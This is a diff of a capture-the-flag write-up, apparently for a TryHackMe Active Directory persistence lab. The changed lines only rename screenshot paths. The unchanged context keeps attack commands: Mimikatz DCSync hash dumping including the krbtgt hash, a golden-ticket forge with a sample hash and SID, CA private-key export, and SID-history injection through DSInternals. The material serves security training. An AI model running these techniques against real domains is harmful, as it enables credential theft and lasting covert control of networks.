@@ -48,7 +48,7 @@ lsadump::dcsync /domain:za.tryhackme.loc /user:$YourLow-privilegeADUsername
 log $username_dcdump.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35) (4).png" alt=""><figcaption></figcaption></figure>
 
 Now, instead of specifying our account, we will use the /all flag:
 
@@ -58,7 +58,7 @@ Now, instead of specifying our account, we will use the /all flag:
 lsadump::dcsync /domain:za.tryhackme.loc /all
 ```
 
-<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 **What is the NTLM hash associated with the krbtgt user?**
 
@@ -68,7 +68,7 @@ lsadump::dcsync /domain:za.tryhackme.loc /all
 lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Persistence through Tickets
 
@@ -111,7 +111,7 @@ Parameters explained:
 kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
 ```
 
-<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (116) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can verify that the golden ticket is working by running the dir command against the domain controller.
 
@@ -160,7 +160,7 @@ Let's first see if we can view the certificates stored on the DC.
 crypto::certificates /systemstore:local_machine
 ```
 
-<figure><img src="../../.gitbook/assets/image (19) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable.
 
@@ -173,7 +173,7 @@ crypto::cng
 crypto::certificates /systemstore:local_machine /export
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (8).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd) - THMDC**
 
@@ -181,7 +181,7 @@ crypto::certificates /systemstore:local_machine /export
 dir
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Generating our own Certificates
 
@@ -311,7 +311,7 @@ This confirms that our user does not currently have any SID History set. Let's g
 Get-ADGroup "Domain Admins"
 ```
 
-<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (36) (4).png" alt=""><figcaption></figcaption></figure>
 
 We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored.
 
@@ -325,7 +325,7 @@ Add-ADDBSidHistory -SamAccountName $UsernameOfOurLow-privelegedADAccount -SidHis
 Start-Service -Name ntds  
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.
 
@@ -349,9 +349,9 @@ Get-ADUser $lowUser -Properties sidhistory
 dir \\thmdc.za.tryhackme.loc\c$ 
 ```
 
-<figure><img src="../../.gitbook/assets/image (16) (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (117) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Persistence through Group Membership
 
@@ -425,7 +425,7 @@ Instantly, your low-privileged user should now have privileged access to THMDC. 
 dir \\thmdc.za.tryhackme.loc\c$\ 
 ```
 
-<figure><img src="../../.gitbook/assets/image (16) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:
 
